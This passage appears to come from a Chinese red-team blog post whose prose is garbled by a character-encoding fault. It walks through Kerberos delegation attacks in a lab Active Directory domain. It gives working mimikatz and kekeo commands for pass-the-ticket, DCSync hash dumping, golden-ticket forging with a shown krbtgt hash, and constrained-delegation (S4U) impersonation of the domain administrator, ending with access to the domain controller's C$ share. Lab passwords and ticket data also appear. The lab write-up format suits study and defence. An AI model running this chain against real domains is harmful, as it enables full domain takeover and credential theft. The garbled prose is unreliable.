class="line">OIe9ReSaqJMyNdDFupM/snJN2vkqmvKmHHf3N+4N488CZGg81Jg21mpV9CpM36yVnEhJSjPTGZQ/5RTe8F9JbxuFOsiSzKrcuPLC</span><br><span class="line">hX5vml13+ZsFrKU+WueBDVahbDi7FGHO0P4XzUo3l7Zmqyh/yx0uTXo75kIzlH1Ja7uA4cKMQSpQMEAPx4lFxPiRW+urwVUlHcAj</span><br><span class="line">/oak6KmE0kpd2HSZI5qp3JNwCQQyAaFmjgb/uDFsBDZHik4F24IP7JVjS52Uzd8mH5lAXlQ+WOnXqWpAtU3NCLznBp+4MaeN4M2+</span><br><span class="line">xa1DPIxLoFQ9P2betxccn9oWNlbIy5uG0J/5Xfe+gLjD5ySv2riJOGwj/PcLFHtX3FbgZBjITxeKkx5kgiigwgzepm7pi2IchQws</span><br><span class="line">6RU2ZqZBt1vcmnBy2sZrzQBSrpmaVtJ7p45EAkGcN0kbMX6rhxkUmxlFKCT/V0DBsZiQMpp+fZ+EiGhbh5QQvJub3B1H44HRiCOo</span><br><span class="line">BZ1JvvV/USsfz9G4UVelZq5XxeBzKXJxw1cROiCnDOoaVQ7pxTB8lxSJR/sUWln27JSPGR4KfAQ+IC4bYRYZhtS/3UnYOI5jY4Mk</span><br><span class="line">hL06XE/+ZnukN3aQHjRntvyz4YGvxrb4o39XdLkd6ELX3p+8IOuC7gWYWYH6OOPZ+yozp+LTxduajHOKI5RfMaN+hMtMIm9QV0FZ</span><br><span class="line">87XHmeus5dNmWvv3zIbgB7HHtS9pJr7xwYine0k1VU//ThAv1Rs9ZA/RqwKTQ+F2Wc4Xm0gk9SCpERgohIyn57zKPDvtDEz8FBaS</span><br><span class="line">G6McktTAQbVCPsQwgqiujUHeRxW3+8bLyaVWtw1MYyb587WPpjx6dWFFO/RfGcl1sL01/V5xmuIgFYrv4PNj4pCzD0srozn+XMyf</span><br><span class="line">QLv2Tmb9nMjGHNT+6Yg/DuuNSa+MRnnjwY1cGPGbiq6rg94DawuOIz/M5ZS1ADrIX9dbTNyMa+dQw0ilqD5m0Lh4XQTKZnuxUVfn</span><br><span class="line">/AaOjkPW1E6RVWEgnKzVX7GcOm43ExVhh3xjJpZ577o+xpq3TVtDVNv5IWEwsmLxPsQ/QiIRKO1iLQ7s0Eo6/YOto+uJwYiPSgD4</span><br><span class="line">9Gc4J5HtFKd7zjlO7xgzugDjihk52d87FbBJ+ylkA5F8gBgzZ+Z6AaTzr30qzjghxVxhwlvzOP69iwuW9FivzRODbt5WJQfdOzYC</span><br><span class="line">MzQPw0xHQNFAGvc5F3doo4HiMIHfoAMCAQCigdcEgdR9gdEwgc6ggcswgcgwgcWgKzApoAMCARKhIgQgMZNCRa6kItt+27WKjzKL</span><br><span class="line">5Vpvee7mzMgsCtdO0vCyT7GhDhsMUkVEVEVBTS5DTFVCohEwD6ADAgEBoQgwBhsEQUQxJKMHAwUAYKEAAKURGA8yMDIyMDMyMzA0</span><br><span class="line">NTQyN1qmERgPMjAyMjAzMjMxNDU0MjZapxEYDzIwMjIwMzMwMDQ1NDI2WqgOGwxSRURURUFNLkNMVUKpITAfoAMCAQKhGDAWGwZr</span><br><span class="line">cmJ0Z3QbDFJFRFRFQU0uQ0xVQg==&quot;))</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/format,webp.webp" alt="img" style="zoom:80%;">
</li>
<li><p>ç„¶ååˆ©ç”¨mimikatzæŠŠç¥¨æ®å¯¼å…¥åˆ°å†…å­˜ä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list   #å…ˆç”¨å‘½ä»¤æŸ¥çœ‹æ˜¯å¦æœ‰ç¼“å­˜çš„ç¥¨æ®ï¼Œå¦‚æœæœ‰ç”¨kerberos::purgeå‘½ä»¤åˆ é™¤</span><br><span class="line">kerberos::ptt C:\users\test\ticket.kirbi  #å¯¼å…¥ç¥¨æ®</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313596-xdB4aWqLDVC6d8BNSGLBBL-0-062a57f5ff11d5c30836bcb269fd9fec&image_process=resize,w_571.25" alt="img" style="zoom:80%;">
</li>
<li><p>å¯¼å…¥ç¥¨æ®æˆåŠŸåï¼Œå°è¯•è®¿é—®åŸŸæ§ï¼Œè¿˜æ˜¯æ— æ³•è®¿é—®åˆ°</p>
<img src="/2022/05/15/22-0515-01/image-165331557657023.png" alt="img" style="zoom:80%;">
</li>
<li><p>ä½†æ˜¯ç”±äºåŸŸæ§æœºå™¨è´¦æˆ·æ˜¯é»˜è®¤æ‹¥æœ‰DCSyncæƒé™çš„ï¼Œæ‰€ä»¥å¯¼å…¥TGTç¥¨æ®åï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨mimikatzæŠŠåŸŸå†…ç”¨æˆ·çš„hashå€¼å¯¼å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:redteam.club /all /csv&quot; &quot;exit&quot;&gt;log.txt</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image-165331628050425.png" alt="img" style="zoom:80%;">

<p>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313597-4iWV4Ba8EsPqr4RuCuZHU4-0-2091f1d65b28f2539236cc1a5a251c57&image_process=resize,w_913.75" alt="img" style="zoom:80%;">

</p><p>åœ¨log.txtä¸­æˆ‘ä»¬å¾—åˆ°äº†krbtgtç”¨æˆ·çš„hashï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥åšé»„é‡‘ç¥¨æ®</p>
</li>
<li><p>å¾—åˆ°åŸŸçš„SIDå€¼ï¼Œç„¶åç”±äºæˆ‘ä»¬è¿˜å¾—åˆ°äº†krbtgtçš„hashå€¼ï¼Œå°±å¯ä¼ªé€ é»„é‡‘ç¥¨æ®</p>
<img src="/2022/05/15/22-0515-01/image-165331637527228.png" alt="img" style="zoom:80%;">
</li>
<li><p>åˆ©ç”¨mimikatzä¼ªé€ é‡‘ç¥¨ntlm.kirbi</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:redteam.club /sid:S-1-5-21-2365300756-2663045586-4193326672 /krbtgt:b6e0fcce3106665064de4917394ccc27 /user:administrator /ticket:ntlm.kirbi</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image-165331639820830.png" alt="img" style="zoom:80%;">
</li>
<li><p>åˆ©ç”¨mimikatzå¯¼å…¥é‡‘ç¥¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt ntlm.kirbi    //æ³¨æ„å¯¼å…¥ç¥¨æ®å‰æœ€å¥½å…ˆæŠŠç¼“å­˜ä¸­çš„ç¥¨æ®åˆ é™¤</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653313597-oKEVuPcSEVmNbpn9W1mnGt-0-a09373dd9a9a9dc9b3586eecfab93169&image_process=resize,w_407.5" alt="img" style="zoom:80%;">
</li>
<li><p>å†æ¬¡å°è¯•è®¿é—®åŸŸæ§å³å¯æˆåŠŸ</p>
<img src="/2022/05/15/22-0515-01/image-165331643837433.png" alt="img" style="zoom:80%;"></li>
</ol>
<h3 id="ç¥¨æ®å¯¼å…¥æ—¶å€™çš„æ³¨æ„äº‹é¡¹"><a href="#ç¥¨æ®å¯¼å…¥æ—¶å€™çš„æ³¨æ„äº‹é¡¹" class="headerlink" title="ç¥¨æ®å¯¼å…¥æ—¶å€™çš„æ³¨æ„äº‹é¡¹"></a>ç¥¨æ®å¯¼å…¥æ—¶å€™çš„æ³¨æ„äº‹é¡¹</h3><p>å¯¼å…¥ç¥¨æ®å‰æœ€å¥½æŠŠç¼“å­˜çš„ç¥¨æ®å…¨éƒ¨æ¸…ç©º</p>
<p>cmdå‘½ä»¤è¡Œä¸­å¯ä»¥ç”¨klistå‘½ä»¤æŸ¥çœ‹ï¼Œæ¸…ç©ºç”¨klist purgeå…¨éƒ¨æ¸…ç©ºã€‚æ›´å¤šä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/klist">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/klist</a></p>
<p>mimikatzä¸­åˆ™ç”¨kerberos::list æ¥æŸ¥çœ‹ç¼“å­˜çš„ç¥¨æ®ï¼Œç”¨kerberos::purgeæ¥æ¸…ç©º	</p>
<h1 id="çº¦æŸæ€§å§”æ´¾"><a href="#çº¦æŸæ€§å§”æ´¾" class="headerlink" title="çº¦æŸæ€§å§”æ´¾"></a>çº¦æŸæ€§å§”æ´¾</h1><h2 id="æ— S4U2Selfå‚ä¸"><a href="#æ— S4U2Selfå‚ä¸" class="headerlink" title="æ— S4U2Selfå‚ä¸"></a>æ— S4U2Selfå‚ä¸</h2><p>S4U2proxyï¼šS4U2proxyå¯ä»¥ä»¥ç”¨æˆ·çš„åä¹‰è¯·æ±‚å…¶å®ƒæœåŠ¡çš„ STï¼Œé™åˆ¶äº† S4U2proxy æ‰©å±•çš„èŒƒå›´ã€‚æœåŠ¡å¸æˆ·å¯ä»¥ä»£è¡¨ä»»ä½•ç”¨æˆ·è·å–åœ¨ <code>msDS-AllowedToDelegateTo</code> ä¸­è®¾ç½®çš„æœåŠ¡çš„ TGS&#x2F;STï¼Œé¦–å…ˆéœ€è¦ä»è¯¥ç”¨æˆ·åˆ°å…¶æœ¬èº«çš„ TGS&#x2F;STï¼Œä½†å®ƒå¯ä»¥åœ¨è¯·æ±‚å¦ä¸€ä¸ª TGS ä¹‹å‰ä½¿ç”¨ S4U2self è·å¾—æ­¤ TGS&#x2F;STã€‚</p>
<blockquote>
<p>ç”¨æˆ·Aä»¥kerberosä¸server1è¿›è¡Œè®¤è¯ï¼Œè®¤è¯è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
</blockquote>
<img src="/2022/05/15/22-0515-01/image-165331656556935.png" alt="img" style="zoom:80%;">

<h2 id="æœ‰S4U2Selfå‚ä¸"><a href="#æœ‰S4U2Selfå‚ä¸" class="headerlink" title="æœ‰S4U2Selfå‚ä¸"></a>æœ‰S4U2Selfå‚ä¸</h2><p>S4U2Selfï¼šS4U2selfå¯ä»¥ä»£è¡¨è‡ªèº«è¯·æ±‚é’ˆå¯¹å…¶è‡ªèº«çš„ Kerberos æœåŠ¡ç¥¨æ®(ST)ï¼›å¦‚æœä¸€ä¸ª<strong>æœåŠ¡è´¦æˆ·</strong>çš„ userAccountControl æ ‡å¿—ä¸º <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>, åˆ™å…¶å¯ä»¥<strong>ä»£è¡¨ä»»ä½•å…¶ä»–ç”¨æˆ·</strong>è·å–è‡ªèº«æœåŠ¡çš„ TGS&#x2F;STã€‚</p>
<blockquote>
<p>ç”¨æˆ·Aä»¥å…¶å®ƒæ–¹å¼ï¼ˆå¦‚NTLMè®¤è¯ã€åŸºäºè¡¨å•çš„è®¤è¯æ–¹å¼ï¼‰ä¸server1è¿›è¡Œè®¤è¯ï¼Œç”¨æˆ·æ˜¯æ— æ³•å‘server1æä¾›ç¥¨æ®ST1çš„ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¹Ÿæ— æ³•è¿›ä¸€æ­¥åˆ©ç”¨S4U2Proxyå»è®¿é—®server2äº†ã€‚å“ªä¹ˆæˆ‘ä»¬å¦‚ä½•æ¥å¾—åˆ°è¿™ä¸ªST1ç¥¨æ®å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥åˆ©ç”¨S4U2Selfæ¥è§£å†³è¿™ä¸ªé—®é¢˜</p>
</blockquote>
<img src="/2022/05/15/22-0515-01/image-165331670470737.png" alt="img" style="zoom:80%;">

<h2 id="å¦‚ä½•æƒ³åŠæ³•è¿›è¡Œåˆ©ç”¨ï¼š"><a href="#å¦‚ä½•æƒ³åŠæ³•è¿›è¡Œåˆ©ç”¨ï¼š" class="headerlink" title="å¦‚ä½•æƒ³åŠæ³•è¿›è¡Œåˆ©ç”¨ï¼š"></a>å¦‚ä½•æƒ³åŠæ³•è¿›è¡Œåˆ©ç”¨ï¼š</h2><p>server1è®¿é—®server2å°±ç›¸å½“äºç”¨æˆ·Aè®¿é—®server2çš„cifsæœåŠ¡ï¼Œè€Œå¦‚æœè¿™é‡Œçš„ç”¨æˆ·Aèƒ½å¤Ÿä¼ªé€ æˆåŸŸç®¡ç†å‘˜ç”¨æˆ·ï¼Œé‚£ä¹ˆserver1è®¿é—®server2å°±ç›¸å½“äºåŸŸç®¡ç†å‘˜è®¿é—®server2çš„cifsæœåŠ¡ï¼Œé‚£ä¹ˆä¸€å®šæ˜¯å¯ä»¥è®¿é—®æˆåŠŸçš„ï¼Œå˜¿å˜¿ï¼ï¼ï¼</p>
<h2 id="æµ‹è¯•ç¯å¢ƒå¦‚ä¸‹ï¼š"><a href="#æµ‹è¯•ç¯å¢ƒå¦‚ä¸‹ï¼š" class="headerlink" title="æµ‹è¯•ç¯å¢ƒå¦‚ä¸‹ï¼š"></a>æµ‹è¯•ç¯å¢ƒå¦‚ä¸‹ï¼š</h2><img src="/2022/05/15/22-0515-01/image-165331676225539.png" alt="img" style="zoom:80%;">

<p>

<img src="/2022/05/15/22-0515-01/image-165331704370741.png" alt="img" style="zoom:80%;">

</p><h2 id="ç¯å¢ƒé…ç½®-2"><a href="#ç¯å¢ƒé…ç½®-2" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><ol>
<li><p>åœ¨åŸŸæ§12server-ad1ä¸Šé¢å–æ¶ˆ12server1å’Œ12server2çš„å§”æ´¾</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316503-s7DW8zg5qMc5vNcJC9Hy7G-0-d618832f5e1a19dc089ef5bc5c2eeeb0&image_process=resize,w_616.25" alt="img" style="zoom:80%;">

<p>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316503-iGyur53gE5Ty7agk8jBJPN-0-929c16133a538405bb29e7ebf72a3376&image_process=resize,w_607.5" alt="img" style="zoom:80%;">
</p></li>
<li><p>åœ¨åŸŸæ§12server-ad1ä¸Šåˆ›å»ºåŸŸç”¨æˆ·websecï¼Œå¯†ç ä¸ºï¼špass@123ï¼Œåˆ›å»ºå®Œæˆåæ˜¯æ²¡æœ‰å§”æ´¾é€‰é¡¹çš„ï¼Œå› ä¸ºæœåŠ¡è´¦å·æ‰å¯ä»¥è¿›è¡Œå§”æ´¾</p>
</li>
<li><p>ç„¶åè®¾ç½®websecä¸ºæœåŠ¡è´¦å·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A cifs/12server2.redteam.club websec</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316503-feVHJCByMntZZoVqobHDj1-0-b2397f0f8cb7025ccd4c3eb11f5e1ee1&image_process=resize,w_712.5" alt="img" style="zoom:80%;">
</li>
<li><p>ç„¶åå¯¹websecè´¦å·åšå§”æ´¾è®¾ç½®ï¼Œé€‰æ‹©ä½¿ç”¨ä»»ä½•èº«ä»½åè®®è¿™ä¸ªé€‰é¡¹å®é™…å°±æ˜¯ä»¥å…è®¸NTLMè®¤è¯ã€åŸºäºè¡¨å•çš„è®¤è¯æ–¹å¼è¿›è¡Œè®¤è¯ï¼Œä¹Ÿå°±æ˜¯æœ‰S4U2Selfå‚ä¸çš„è¿‡ç¨‹ï¼Œå¦‚æœé€‰æ‹©ä»…ä½¿ç”¨kerberosï¼Œé‚£ä¹ˆå°±æ˜¯æ— S4U2Selfå‚ä¸çš„è¿‡ç¨‹ï¼Œè¿™é‡Œé€‰æ‹©ä»»ä½•èº«ä»½åè®®è¿™ä¸ªé€‰é¡¹ã€‚</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316503-bQHB9YknitVRJ5giJcbnJh-0-5cf257ec0764d93d51096c1b6659b4f6&image_process=resize,w_617.5" alt="img" style="zoom:80%;">

<p>

<img src="/2022/05/15/22-0515-01/image-165331714971847.png" alt="img" style="zoom:80%;">

</p><p>é…ç½®æœåŠ¡è´¦å·websecåˆ°åŸŸæ§AD1çš„çº¦æŸæ€§å§”æ´¾ï¼Œå³å…è®¸æœåŠ¡æœåŠ¡è´¦å·websecè®¿é—®åˆ°AD1</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316503-8fTdFykzLX51KaBBtX5uEn-0-48df30d3a3ef51df834442f926b610a4&image_process=resize,w_681-165331716381850.25" alt="img" style="zoom:80%;">

<p>æ›´å‡†ç¡®æ˜¯å…è®¸æœåŠ¡è´¦å·è®¿é—®AD1çš„cifsæœåŠ¡</p>
<img src="/2022/05/15/22-0515-01/image-165331718097952.png" alt="img" style="zoom:80%;">

<p>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-j9jyP3tAGo3wig5wbJofwo-0-510df19ec24535767d3f0d3a4c768374&image_process=resize,w_601.25" alt="img" style="zoom:80%;"></p></li>
</ol>
<h2 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>è¿™é‡Œå¤ç°ç”¨12server2æ¥åšæµ‹è¯•ï¼ˆç”¨12server1ä¹Ÿè¡Œæ²¡å•¥åŒºåˆ«ï¼‰</p>
<ol>
<li><p>åœ¨12server2ä¸Šç”¨åŸŸç”¨æˆ·hackç™»é™†ï¼Œç„¶åæŸ¥è¯¢é…ç½®çº¦æŸå§”æ´¾çš„æœåŠ¡è´¦æˆ·æœ‰å“ªäº›</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥è¯¢åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„æœºå™¨è´¦æˆ·</span><br><span class="line">AdFind.exe -h 10.10.10.142 -u hack -up pass@123 -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"># æŸ¥è¯¢åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„æœåŠ¡è´¦æˆ·</span><br><span class="line">AdFind.exe -h 10.10.10.142 -u hack -up pass@123 -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line">æˆ–è€…ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼ˆä½†æ˜¯æµ‹è¯•çš„æ—¶å€™ç”¨ä¸‹é¢å‘½ä»¤æŸ¥ä¸å‡ºæ¥ã€‚ã€‚å¾ˆå¥‡æ€ªã€‚ã€‚ã€‚ç„å­¦é—®é¢˜ï¼‰</span><br><span class="line"></span><br><span class="line"># æŸ¥è¯¢åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„æœºå™¨è´¦æˆ·</span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306369)(msds- allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"># æŸ¥è¯¢åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„æœåŠ¡è´¦æˆ·</span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=club&quot; -f &quot;(&amp;(samAccountType=805306368)(msds- allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-9MQhyo7C6eMRWr3BQzQkiB-0-1bb207bc065146209b5891e7e5b26f20&image_process=resize,w_913.75" alt="img" style="zoom:80%;">
</li>
<li><p>é€šè¿‡kekeoè¯·æ±‚æœåŠ¡ç”¨æˆ·websecçš„TGT</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:websec /domain:redteam.club /password:pass@123 /ticket:test.kirbi</span><br><span class="line">/user: æœåŠ¡ç”¨æˆ·çš„ç”¨æˆ·å</span><br><span class="line">/password: æœåŠ¡ç”¨æˆ·çš„æ˜æ–‡å¯†ç </span><br><span class="line">/domain: æ‰€åœ¨åŸŸå</span><br><span class="line">/ticket: æŒ‡å®šç¥¨æ®åç§°ï¼Œä¸è¿‡è¿™ä¸ªå‚æ•°æ²¡æœ‰ç”Ÿæ•ˆï¼Œå¯ä»¥å¿½ç•¥</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-gZmbaaCGSqCKpdCN8E4mUu-0-2015386a5558cfe7ee459300903f28fa&image_process=resize,w_827.5" alt="img" style="zoom:80%;">

<p>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-9zhzdozvTg1Yz2onwSPmPb-0-5aeb9ed5a2ee87ee2b195e68051e87b1&image_process=resize,w_116.25" alt="img" style="zoom:80%;">
</p></li>
<li><p>åˆ©ç”¨è¿™ä¸ª TGT é€šè¿‡ä¼ªé€  s4u è¯·æ±‚ä»¥åŸŸç®¡ç†å‘˜ç”¨æˆ·èº«ä»½è¯·æ±‚è®¿é—® åŸŸæ§ad1ä¸Š CIFSï¼Œæ³¨æ„ï¼šè¿™é‡Œå®é™…æ˜¯å…ˆè¯·æ±‚äº†ST1ç¥¨æ®ï¼Œç„¶ååˆç”¨ST1è¯·æ±‚äº†ST2ç¥¨æ®ï¼Œä¹Ÿå°±æ˜¯æŠŠä¸Šé¢æµ‹è¯•ç¯å¢ƒå›¾ä¸­çš„â‘¢å’Œâ‘¤ä¸¤ä¸ªè¿‡ç¨‹åˆå¹¶äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_websec@REDTEAM.CLUB_krbtgt~redteam.club@REDTEAM.CLUB.kirbi /user:Administrator@redteam.club /service:cifs/ad1.redteam.club</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-b7Uk98updL1t4ZFz1wihPu-0-4d1994ffd93c3f11af24514330552a2e&image_process=resize,w_838.75" alt="img" style="zoom:80%;">

<p>ST1ç¥¨æ®å¦‚ä¸‹ï¼š</p>
<img src="/2022/05/15/22-0515-01/image-165331742593263.png" alt="img" style="zoom:80%;">

<p>ST2ç¥¨æ®å¦‚ä¸‹ï¼š</p>
<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-fZFw5BUdpnzD7JukncnVxy-0-75c45592256f8ce092c6e1a915f9ff46&image_process=resize,w_96.25" alt="img" style="zoom:80%;">

<p>æ³¨æ„ï¼šæˆ‘ä»¬æœ€åå®é™…éœ€è¦ç”¨çš„æ˜¯ST2ç¥¨æ®</p>
</li>
<li><p>ä½¿ç”¨kekeoå¯¼å…¥ST2ç¥¨æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@redteam.club@REDTEAM.CLUB_cifs~ad1.redteam.club@REDTEAM.CLUB.kirbi</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-p1P9TXmUiHi6ZpuP6ALXd2-0-95f20cd78ab3609a0aeeebd9ef536c69&image_process=resize,w_818.75" alt="img" style="zoom:80%;">
</li>
<li><p>è®¿é—®åŸŸæ§çš„CIFSæœåŠ¡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\ad1.redteam.club\c$</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/22-0515-01/image.pngauth_key=1653316504-b1jEHgk4dUCWawHVxDypqQ-0-43094d1531c6721c0cb4afcb4c970570&image_process=resize,w_551.25" alt="img" style="zoom:80%;"></li>
</ol>
<h1 id="èµ„æºå§”æ´¾"><a href="#èµ„æºå§”æ´¾" class="headerlink" title="èµ„æºå§”æ´¾"></a>èµ„æºå§”æ´¾</h1>
        </div>		
		
        <section class="post-tags">
            <div>
                <span>æ ‡ç­¾:</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="/">
                    <i class="iconfont icon-home"></i>
                    ä¸»é¡µ
                </a>
                <span>Â· </span>
                <a href="javascript:window.history.back();">
                    <i class="iconfont icon-back"></i>
                    è¿”å›
                </a>
                
                
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/05/16/22-0516-01/">vulnhubé¶æœºâ€”OS-Hax</a>
            
            
            <a class="next" rel="next" href="/2022/05/15/22-0514-02/">vulnhubé¶æœºâ€”trollcave</a>
            
        </section>
        <br>
        
            <section id="comments" class="comments">
              <style>
                  .comments{ margin-top: 30px;}
                  .v .vlist .vcard .vcontent {padding-top: 0;}
                  .vcontent p { color:grey; margin-bottom: 10px;}
                  .v * {line-height: normal;}
                  .v .vwrap  {border-radius: 0px; padding: 10px;}
                  .v .vbtn {border-radius: 0px;}
                  .v code, .v pre {border-radius: 0px;}
                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
                  .v .vlist .vcard {padding-top: 0;}
                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
              </style>
              <div class="valine_comment"></div>
<!--è½½å…¥jsï¼Œåœ¨</body>ä¹‹å‰æ’å…¥å³å¯-->
<!--Leancloud æ“ä½œåº“:-->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<!--Valine çš„æ ¸å¿ƒä»£ç åº“-->
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
        placeholder: 'æƒ³å¯¹ä½œè€…è¯´ç‚¹ä»€ä¹ˆ...',
        notify: 'false',
        verify: 'false',
        avatar: 'retro',
        visitor: 'true'
    });
</script>
            </section>
        
    </article>
</div>



<style>

.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }

</style>
        </div>
        <footer id="footer" class="footer">

 <div class="copyright">

 <span>Â© ğ´_ğ‘Œğ‘¢

 <!-- è®¿å®¢æ•°é‡ -->

 

 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<span class="site-uv">
    | æ€»è®¿å®¢é‡:
    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
</span>&nbsp;


<span class="site-pv">
    | æ€»è®¿é—®é‡:
    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
</span>


 

 </span>

 </div>

</footer>
    </div>
</body>
</html>


	



<script type="text/javascript" src="\js\jquery.js"></script>
<script type="text/javascript" src="\js\jquery.min.js"></script>

<script  type="text/javascript" src="\js\snow.js"></script>

